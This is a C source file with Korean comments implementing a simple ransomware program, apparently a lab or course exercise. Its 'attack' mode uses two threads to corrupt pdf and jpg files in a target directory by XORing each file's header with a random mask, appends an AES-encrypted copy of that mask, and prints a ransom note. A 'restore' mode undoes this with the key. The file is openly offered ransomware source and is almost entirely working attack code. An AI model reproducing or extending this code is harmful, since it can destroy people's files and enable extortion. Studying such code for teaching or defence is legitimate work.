#include <pthread.h>  // POSIX 스레드 라이브러리 (멀티스레드 처리)
#include <dirent.h>   // 디렉토리 탐색을 위한 함수 (opendir, readdir 등)
#include <unistd.h>   // 파일 처리 및 시스템 호출 관련 함수 (ftruncate 등)
#include <strings.h>  // 문자열 비교 함수 (strcasecmp 등)
#include "utils.h"    // 사용자 정의 유틸리티 함수 포함
#include "crypto.h"   // 암호화/복호화 관련 함수 포함 (AES 등)

#define TARGET_DIR "target"   // 파일 탐색을 위한 디렉토리
#define KEY_SIZE 16           // AES 암호화에 사용될 키의 크기 (16바이트)
#define MAX_FILES 1000        // 최대 파일 처리 개수
#define MAX_FILENAME_LEN 256  // 파일 이름의 최대 길이

// 전역 변수
pthread_mutex_t result_mutex;                         // 처리된 파일 목록과 카운트 작업의 동기화를 위한 뮤텍스
char processed_files[MAX_FILES][MAX_FILENAME_LEN];    // 처리된 파일 이름 저장
int processed_count = 0;                              // 처리된 파일 개수

// 스레드 데이터 구조체 정의
typedef struct {
    char *file_extension;   // 파일 확장자
    int *count;             // 해당 파일의 카운트를 저장할 포인터
    unsigned char *key;     // 암호화/복호화에 사용할 비밀키
    int local_count;        // 스레드 내에서 카운트
} thread_data_t;


// 파일 처리 순서 기록 함수
void add_processed_file(const char *filename) {
    // 뮤텍스 잠금: 특정 코드 영역(임계영역)에 하나의 스레드만 접근하도록 제한
    // 이를 통해 여러 스레드가 동시에 같은 자원에 접근하여 발생하는 데이터 충돌 방지
    pthread_mutex_lock(&result_mutex);

    // 중복 확인: 이미 처리된 파일인지 검사
    for (int i = 0; i < processed_count; i++) {
        // 대소문자를 구분하지 않고 파일 이름 비교
        if (strcasecmp(processed_files[i], filename) == 0) {
            // 중복된 파일이면 뮤텍스를 해제하고 함수 종료
            pthread_mutex_unlock(&result_mutex);
            return;
        }
    }

    // 중복이 없는 경우 처리된 파일 배열에 추가
    if (processed_count < MAX_FILES) {  // 배열 크기를 초과하지 않는지 확인
        // 파일 이름을 배열에 복사, 최대 길이를 초과하지 않도록 조정
        strncpy(processed_files[processed_count], filename, MAX_FILENAME_LEN - 1);
        processed_files[processed_count][MAX_FILENAME_LEN - 1] = '\0'; // 널 종료 보장
        processed_count++;  // 처리된 파일 개수 증가
    }

    // 뮤텍스 해제: 임계영역 작업 완료 후 다른 스레드가 접근할 수 있도록 허용
    pthread_mutex_unlock(&result_mutex);
}

// 결과 출력 함수
// 먼저 처리가 완료된 파일 확장자에 대해 먼저 출력 메시지를 작성(pdf가 먼저 완료되면 pdf 먼저, jpg가 먼저 완료되면 jpg 먼저)
void print_results(const char *operation) {
    int pdf_count = 0, jpg_count = 0;
    int last_is_pdf = 0, last_is_jpg = 0;

    // 파일별 출력 및 확장자 카운트
    for (int i = 0; i < processed_count; i++) {
        if (strstr(processed_files[i], ".pdf") || strstr(processed_files[i], ".PDF")) {
            pdf_count++;
            last_is_pdf = 1;  // 마지막 파일이 pdf로 설정
            last_is_jpg = 0;
            printf("[%s] %s\n", operation, processed_files[i]);  // 처리된 파일 이름 출력
        } else if (strstr(processed_files[i], ".jpg") || strstr(processed_files[i], ".JPG")) {
            jpg_count++;
            last_is_jpg = 1;  // 마지막 파일이 jpg로 설정
            last_is_pdf = 0;
            printf("[%s] %s\n", operation, processed_files[i]);  // 처리된 파일 이름 출력
        }
    }

    // 요약 정보 출력 (마지막 파일 확장자 기준으로 출력 순서 결정)
    if (processed_count > 0) {
        if (last_is_pdf) {  // 마지막이 pdf인 경우
            printf("[%s] %d jpg files were %s\n", operation, jpg_count,
                       strcmp(operation, "attack") == 0 ? "encrypted" : "decrypted");
            printf("[%s] %d pdf files were %s\n", operation, pdf_count,
                       strcmp(operation, "attack") == 0 ? "encrypted" : "decrypted");
        } else if (last_is_jpg) {  // 마지막이 jpg인 경우
            printf("[%s] %d pdf files were %s\n", operation, pdf_count,
                       strcmp(operation, "attack") == 0 ? "encrypted" : "decrypted");
            printf("[%s] %d jpg files were %s\n", operation, jpg_count,
                       strcmp(operation, "attack") == 0 ? "encrypted" : "decrypted");
        }
    }
}



// 공격 스레드 함수
void *attack(void *param) {
    // 전달받은 파라미터를 thread_data_t 구조체로 변환
    thread_data_t *data = (thread_data_t *)param;
    char *extension = data->file_extension;  // 파일 확장자
    // int *count = data->count;  // 파일 카운트를 위한 포인터
    unsigned char *key = data->key;  // 비밀키

    DIR *dir;  // 디렉토리 포인터
    struct dirent *ent;  // 디렉토리 엔트리 포인터

    if ((dir = opendir(TARGET_DIR)) != NULL) {  // TARGET_DIR 디렉토리 열기
        while ((ent = readdir(dir)) != NULL) {  // 디렉토리 엔트리를 하나씩 읽음
            // 파일 확장자가 목표 확장자와 일치하는지 검사 (대소문자 구분 없이 비교)
            if (strcasecmp(ent->d_name + strlen(ent->d_name) - strlen(extension), extension) == 0) { // 두 문자열이 동일하면 0 반환
                add_processed_file(ent->d_name);  // 처리된 파일 기록

                // 파일 암호화 로직
                char filepath[512];  // 파일 경로 저장 변수
                snprintf(filepath, sizeof(filepath), "%s/%s", TARGET_DIR, ent->d_name);  // 파일 경로 생성

                FILE *file = fopen(filepath, "r+b");  // 파일 열기 (읽기 및 쓰기)
                if (file) {
                    unsigned char plaintext[KEY_SIZE];  // 평문 저장 배열
                    // 파일에서 평문 읽기 (첫 16바이트)
                    if (fread(plaintext, 1, KEY_SIZE, file) != KEY_SIZE) {
                        fprintf(stderr, "Error reading plaintext from file: %s\n", filepath);  // 오류 메시지
                        fclose(file);
                        continue;  // 다음 파일로 넘어가기
                    }

                    // 랜덤 마스크 생성
                    unsigned char mask[KEY_SIZE];
                    if (RAND_bytes(mask, sizeof(mask)) != 1) {  // 랜덤 바이트 생성
                        fprintf(stderr, "Error generating random mask\n");  // 오류 메시지
                        fclose(file);
                        continue;  // 다음 파일로 넘어가기
                    }

                    // XOR 연산
                    unsigned char ciphertext[KEY_SIZE];  // 암호문 저장 배열
                    for (int i = 0; i < KEY_SIZE; i++) {
                        ciphertext[i] = plaintext[i] ^ mask[i];  // 평문과 mask를 XOR 연산
                    }

                    // 파일에 ciphertext로 덮어쓰기
                    fseek(file, 0, SEEK_SET);
                    fwrite(ciphertext, 1, KEY_SIZE, file);

                    // mask 암호화
                    unsigned char encrypted_mask[KEY_SIZE];  // 암호화한 mask 저장 배열
                    AES_encrypt_mask(mask, key, encrypted_mask);

                    // 파일 끝에 encrypted_mask 추가
                    fseek(file, 0, SEEK_END);
                    fwrite(encrypted_mask, 1, sizeof(encrypted_mask), file);

                    fclose(file);
                } else {
                    fprintf(stderr, "Error opening file for encryption: %s\n", filepath);
                }
            }
        }
        closedir(dir);
    }
    return NULL;
}


// 복원 스레드 함수
void *restore(void *param) {
    // 전달받은 파라미터를 thread_data_t 구조체로 변환
    thread_data_t *data = (thread_data_t *)param;
    char *extension = data->file_extension;  // 파일 확장자
    // int *count = data->count;  // 파일 카운트를 위한 포인터
    unsigned char *key = data->key;  // 비밀키

    DIR *dir;  // 디렉토리 포인터
    struct dirent *ent;  // 디렉토리 엔트리 포인터

    if ((dir = opendir(TARGET_DIR)) != NULL) {  // TARGET_DIR 디렉토리 열기
        while ((ent = readdir(dir)) != NULL) {  // 디렉토리 엔트리를 하나씩 읽음
            // 파일 확장자가 목표 확장자와 일치하는지 검사 (대소문자 구분 없이 비교)
            if (strcasecmp(ent->d_name + strlen(ent->d_name) - strlen(extension), extension) == 0) {
                add_processed_file(ent->d_name);  // 처리된 파일 기록

                // 파일 복원 로직
                char filepath[512];  // 파일 경로 저장 변수
                snprintf(filepath, sizeof(filepath), "%s/%s", TARGET_DIR, ent->d_name);  // 파일 경로 생성

                FILE *file = fopen(filepath, "r+b");  // 파일 열기 (읽기 및 쓰기)
                if (file) {
                    unsigned char ciphertext[KEY_SIZE];  // 암호문 저장 배열
                    unsigned char encrypted_mask[KEY_SIZE];  // 암호화한 mask 저장 배열

                    // 첫 16바이트 읽기 (ciphertext)
                    if (fread(ciphertext, 1, KEY_SIZE, file) != KEY_SIZE) {
                        fprintf(stderr, "Error reading ciphertext from file: %s\n", filepath);  // 오류 메시지
                        fclose(file);
                        continue; // 다음 파일로 넘어가기
                    }

                    // 마지막 16바이트 읽기 (encrypted_mask)
                    fseek(file, -KEY_SIZE, SEEK_END);
                    if (fread(encrypted_mask, 1, KEY_SIZE, file) != KEY_SIZE) {
                        fprintf(stderr, "Error reading encrypted mask from file: %s\n", filepath);  // 오류 메시지
                        fclose(file);
                        continue; // 다음 파일로 넘어가기
                    }

                    // mask 복호화 
                    unsigned char mask[KEY_SIZE];  // 복호화한 mask 저장 배열
                    AES_decrypt_mask(encrypted_mask, key, mask);

                    // plaintext 복원
                    unsigned char plaintext[KEY_SIZE];  // 평문 저장 배열
                    for (int i = 0; i < KEY_SIZE; i++) {
                        plaintext[i] = ciphertext[i] ^ mask[i];  // 암호문과 mask를 XOR 연산
                    }

                    // 파일의 첫 16바이트를 plaintext로 덮어쓰기
                    fseek(file, 0, SEEK_SET);
                    fwrite(plaintext, 1, KEY_SIZE, file);

                    // 파일 끝에서 마지막 16바이트 제거
                    fseek(file, 0, SEEK_END);
                    long current_size = ftell(file); // 파일의 끝에 대한 상대적인 위치
                    ftruncate(fileno(file), current_size - KEY_SIZE); // 마지막 16바이트 삭제

                    fclose(file);
                } else {
                    fprintf(stderr, "Error opening file for restoration: %s\n", filepath);
                }
            }
        }
        closedir(dir);
    }
    return NULL;
}


int main(int argc, char *argv[]) {
    // 명령어 실행 시 입력된 인자가 3개가 아니면 오류 출력 후 종료
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <attack|restore> <key>\n", argv[0]);
        return EXIT_FAILURE; // 비정상 종료
    }

    pthread_t threads[2];        // 두 개의 스레드 ID를 저장할 배열
    thread_data_t thread_data[2]; // 두 개의 스레드에 전달할 데이터 구조체 배열

    // 비밀키 처리
    unsigned char key[KEY_SIZE]; // AES 암호화/복호화에 사용할 16바이트 키 배열
    strncpy((char *)key, argv[2], KEY_SIZE); // 입력된 키를 최대 16바이트로 복사
    for (int i = strlen(argv[2]); i < KEY_SIZE; i++) {
        key[i] = 0; // 키가 16바이트보다 짧으면 남은 공간을 0으로 패딩
    }

    // 스레드 데이터 초기화
    thread_data[0].file_extension = "pdf"; // 첫 번째 스레드는 PDF 파일 처리
    thread_data[0].key = key;              // 비밀키 전달

    thread_data[1].file_extension = "jpg"; // 두 번째 스레드는 JPG 파일 처리
    thread_data[1].key = key;              // 비밀키 전달

    // 뮤텍스 초기화
    pthread_mutex_init(&result_mutex, NULL);

    // 스레드 생성
    if (strcmp(argv[1], "attack") == 0) { // 명령이 'attack'일 경우
        pthread_create(&threads[0], NULL, attack, &thread_data[0]); // PDF 파일 공격 스레드 생성
        pthread_create(&threads[1], NULL, attack, &thread_data[1]); // JPG 파일 공격 스레드 생성
    } else if (strcmp(argv[1], "restore") == 0) { // 명령이 'restore'일 경우
        pthread_create(&threads[0], NULL, restore, &thread_data[0]); // PDF 파일 복원 스레드 생성
        pthread_create(&threads[1], NULL, restore, &thread_data[1]); // JPG 파일 복원 스레드 생성
    } else { // 잘못된 명령 입력 시 오류 메시지 출력 후 종료
        fprintf(stderr, "Invalid operation. Use 'attack' or 'restore'.\n");
        return EXIT_FAILURE;
    }

    // 스레드 종료 대기
    pthread_join(threads[0], NULL); // 첫 번째 스레드가 종료될 때까지 대기
    pthread_join(threads[1], NULL); // 두 번째 스레드가 종료될 때까지 대기

    // 처리 결과 출력
    print_results(strcmp(argv[1], "attack") == 0 ? "attack" : "restore");

    // note 출력
    if (strcmp(argv[1], "attack") == 0) {
        print_ransom_note(); // 공격 완료 메시지 출력
    } else if (strcmp(argv[1], "restore") == 0) {
        print_recovery_note(); // 복구 완료 메시지 출력
    }

    // 뮤텍스 해제
    pthread_mutex_destroy(&result_mutex); // 프로그램 종료 전 뮤텍스 자원 해제
    
    return EXIT_SUCCESS; // 정상 종료
}